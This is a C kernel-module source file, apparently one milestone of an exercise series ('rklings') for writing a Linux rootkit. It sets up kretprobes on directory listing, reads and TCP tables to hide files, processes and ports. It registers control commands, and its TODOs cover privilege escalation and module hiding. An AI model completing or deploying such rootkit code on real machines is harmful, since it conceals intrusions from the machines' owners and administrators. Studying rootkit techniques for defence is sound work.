// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>

static struct kretprobe *probes[] = {
	&rk_mkdir_probe,
	&rk_mkdirat_probe,
	&rk_getdents_probe,
	&rk_read_probe,
	&rk_tcp4_probe,
	&rk_tcp6_probe,
};

static int nr_probes;

static int cmd_ping(const char *arg)
{
	pr_info("rklings: pong\n");
	return 0;
}

static int cmd_status(const char *arg)
{
	pr_info("rklings: alive\n");
	return 0;
}

static int __init rk_init(void)
{
	int ret;

	rk_target_init(&rk_file_targets);
	rk_target_init(&rk_pid_targets);
	rk_target_init(&rk_content_targets);
	rk_target_init(&rk_port_targets);

	ret = rk_cmd_register("ping", cmd_ping);
	if (ret)
		return ret;
	ret = rk_cmd_register("status", cmd_status);
	if (ret)
		return ret;

	// TODO: register subsystem commands (escalation, module, filter)

	ret = rk_proc_init();
	if (ret)
		return ret;

	// TODO: register kretprobes from probes[] table (goto rollback on failure)

	return 0;
}

static void __exit rk_exit(void)
{
	// TODO: unhide module, unregister probes in reverse, remove proc
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings local control milestone");
